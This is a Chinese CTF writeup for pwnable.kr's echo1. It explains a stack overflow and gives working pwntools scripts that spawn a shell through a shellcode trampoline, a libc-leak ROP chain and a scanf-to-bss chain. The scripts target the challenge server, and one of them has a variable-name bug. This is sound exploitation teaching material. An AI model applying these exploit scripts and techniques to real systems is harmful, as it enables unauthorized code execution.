# pwnable.kr - echo1 - writeup

>   原文链接：https://www.cnblogs.com/WangAoBo/p/pwnable_kr_echo1.html

旧题新做，发现这道题能用不少姿势

## 漏洞分析

64位程序，没有开任何保护

```bash
pwnable_echo1 [master●●] check echo1 
echo1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=fa367b7e8f66b68737a56333996d80f0d72e54ea, not stripped
[*] '/home/m4x/pwn_repo/pwnable_echo1/echo1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

IDA可以看出，在echo1这个函数里没有对s的长度进行检查，可以通过控制s触发栈溢出

```C
__int64 echo1()
{
  char s; // [rsp+0h] [rbp-20h]

  (*((void (__fastcall **)(void *))o + 3))(o);  // greeting
  get_input(&s, 128LL);                         // buffer overflow
  puts(&s);
  (*((void (__fastcall **)(void *))o + 4))(o);  // byebye
  return 0LL;
}
```

## 利用方法

### ret2shellcode

有能控制的栈溢出，程序没有开NX，因此第一个想法就是用ret2shellcode了，但shellcode往哪写是个问题(可以通过nop滑梯爆破shellcode在栈上的地址，但实际尝试时太慢，就不说了)，固定的地址只有o和id两个全局变量，o又是malloc出来的，看起来只有id能联系上了。

但仔细观察，可控的只有id的前8个字节，8个字节是写不了shellcode的

```C
  __isoc99_scanf("%24s", name);
  v4 = o;
  *(_QWORD *)o = *(_QWORD *)name;
  v4[1] = *(_QWORD *)&name[8];
  v4[2] = *(_QWORD *)&name[16];
  id = *(_DWORD *)name;
```

>   调试也能看出只能控制id的前8个字节
>
>   ![](http://ww1.sinaimg.cn/large/006AWYXBly1frvhmpb11dj30o80htdho.jpg)

整理一下目前的信息：

-   有arbitrary overflow的栈
-   有能控制的8个字节的全局变量
-   无NX和pie保护

不能直接ret2shellcode是因为不知道shellcode的地址，但我们知道id前8个字节的地址，这样就可以通过这8个字节当一个trampoline，跳到shellcode，我的思路是：

1.  控制id的前8个字节为"jmp rsp"(具体为什么是jmp rsp，通过调试可以清楚地显示)

    ```assembly
    ───────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────
       0x40085f       <echo1+71>    mov    rax, qword ptr [rip + 0x201832] <0x602098>
       0x400866       <echo1+78>    mov    rdi, rax
       0x400869       <echo1+81>    call   rdx
     
       0x40086b       <echo1+83>    mov    eax, 0
       0x400870       <echo1+88>    leave  
     ► 0x400871       <echo1+89>    ret             <0x6020a0; id>
        ↓
       0x6020a0       <id>          jmp    rsp
        ↓
       0x7fffce3ed600               push   rax
       0x7fffce3ed601               xor    rdx, rdx
       0x7fffce3ed604               xor    rsi, rsi
       0x7fffce3ed607               movabs rbx, 0x68732f2f6e69622f
    ───────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────
    00:0000│ rsp  0x7fffce3ed5f8 —▸ 0x6020a0 (id) ◂— jmp    rsp /* 0xe4ff */
    01:0008│      0x7fffce3ed600 ◂— 0x48f63148d2314850
    02:0010│      0x7fffce3ed608 ◂— 0x732f2f6e69622fbb
    03:0018│      0x7fffce3ed610 ◂— 0x50f3bb05f545368
    04:0020│      0x7fffce3ed618 —▸ 0x40000a ◂— add    byte ptr [rax], al
    05:0028│      0x7fffce3ed620 —▸ 0x7fffce3ed710 ◂— 0x1
    06:0030│      0x7fffce3ed628 ◂— 0x0
    07:0038│      0x7fffce3ed630 —▸ 0x400a90 (__libc_csu_init) ◂— mov    qword ptr [rsp - 0x28], rbp
    ```

    ​

2.  通过arbitrary overflow控制echo1的返回地址为id，然后通过id的跳板作用跳到shellcode

**talk is cheap, show you the code**

```python
pwnable_echo1 [master●●] cat sc.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo1")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo1")
    libc = elf.libc


else:
    io = remote("pwnable.kr", 9010)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    io.sendlineafter(" : ", asm("jmp rsp"))
    #  DEBUG("b *echo1\nc")
    io.sendlineafter("> ", "1")
    sc = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
    payload = fit({0x20 + 8: [elf.sym['id'], sc]})
    io.sendline(payload)
    
    io.interactive()
    io.close()
```

### rop

更进一步，如果程序关闭了NX，能不能通过rop解决

答案是肯定的，rop需要有合适的gadget，这里只需要有类似 **pop rdi;ret**的gadget来控制第一个参数即可leak出libc基址，进而返回到system("/bin/sh")

想法很美好，但找来找去也没有找到能控制rdi的gadget（**如果你找到了，请务必告诉我**），利用64位elf通用gadget([参考链接](https://www.cnblogs.com/Ox9A82/Ox9A82/p/5487725.html))偏移凑出的gadget也因为改变了rsp不能用

```assembly
pwndbg> x/3i 0x0000000000400b0f+1
   0x400b10 <__libc_csu_init+128>:	mov    edi,DWORD PTR [rsp+0x30]
   0x400b14 <__libc_csu_init+132>:	add    rsp,0x38
   0x400b18 <__libc_csu_init+136>:	ret    
```

这时候再把目光放到控制id的8个字节上，看一下8个字节，我们能写多少指令

```bash
pwnable_echo1 [master●●] rasm2 -a x86 -b 64 "pop rdi;ret"                            
5fc3
pwnable_echo1 [master●●] rasm2 -a x86 -b 64 "pop rdi;pop rsi;ret"
5f5ec3
pwnable_echo1 [master●●] rasm2 -a x86 -b 64 "pop rdi;pop rsi;pop rdx;ret"
5f5e5ac3
pwnable_echo1 [master●●] rasm2 -a x86 -b 64 "pop rdi;pop rsi;pop rdx;pop rcx;ret"
5f5e5a59c3
```

发现即使是控制4个寄存器的gadget，也只需5个字节，几乎可以满足任何需求了，有以下几种方法

#### 基于 len(asm("pop rdi; ret")) < 8

只控制一个参数，可以先通过puts来leak出libc基址，然后再控制system的参数为/bin/sh即可

```python
pwnable_echo1 [master●●] cat rop.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo1")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo1")
    libc = elf.libc


else:
    io = remote("pwnable.kr", 9010)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    pr = asm('pop rdi;ret')
    io.sendlineafter(" : ", pppr)
    #  DEBUG("b *echo1\nc")
    io.sendlineafter("> ", "1")
    payload = flat([cyclic(0x20 + 8), elf.sym['id'], elf.got['puts'], elf.plt['puts']], elf.sym['echo1'])
    io.sendline(payload)
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
    success("libc.address -> {:#x}".format(libc.address))
    pause()

    payload = flat([cyclic(0x20 + 8), elf.sym['id'], next(libc.search("/bin/sh")), libc.sym['system']])
    io.sendline(payload)
    
    io.interactive()
    io.close()
```

#### 基于 len(asm("pop rdi; pop rsi; ret")) < 8

控制两个参数，可以控制echo1返回到scanf("%s", bss)把shellcode读到一个固定地址上，然后再返回到该地址，需要注意的是通过scanf读入shellcode的话需要避免shellcode中出现bad char截断scanf(可以参考[这道题](https://github.com/M4xW4n9/pwn_repo/tree/master/cmcc_pwnme1))，幸运的是shellcraft生成的shellcode刚好满足条件

```python
pwnable_echo1 [master●●] cat pop2.py 
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo1")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo1")
    libc = elf.libc


else:
    io = remote("pwnable.kr", 9010)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    pppr = asm('pop rdi; pop rsi; ret')
    io.sendlineafter(" : ", pppr)
    #  DEBUG("b *echo1\nc")
    io.sendlineafter("> ", "1")
    payload = flat([cyclic(0x20 + 8), elf.sym['id'], next(elf.search("%s")), elf.bss(), elf.plt['__isoc99_scanf'], elf.bss()])
    io.sendline(payload)

    io.sendline(asm(shellcraft.execve("/bin/sh")))
    
    io.interactive()
    io.close()
```



#### 基于 len(asm("pop rdi; pop rsi; pop rdx;ret")) < 8

因为程序没有read函数，所以我能想到的方法和上一中一样，不再放shellcode

#### 基于 len(asm("pop rdi; pop rsi; pop rdx;pop rcx; ret")) < 8

可以利用ret2syscall（可以参考这道[题目](https://www.cnblogs.com/WangAoBo/p/hackme_inndy_writeup.html#_label3)）的方法，控制

-   rdi = 59（64位系统下execve的系统调用号）
-   rsi -> /bin/sh（execve的第一个参数）
-   rdx = 0（execve的第二个参数）
-   rcx = 0（execve的第三个参数）

我相信能看懂这个方法的师傅是可以独立写出ret2syscall的exp的，这里也不再放exp了

----

以上所有代码均能在我的[github](https://github.com/M4xW4n9/pwn_repo/tree/master/pwnable_echo1)上找到，欢迎star

>   以前觉得巨难理解的一道题，现在回头看还挺简单的。。。
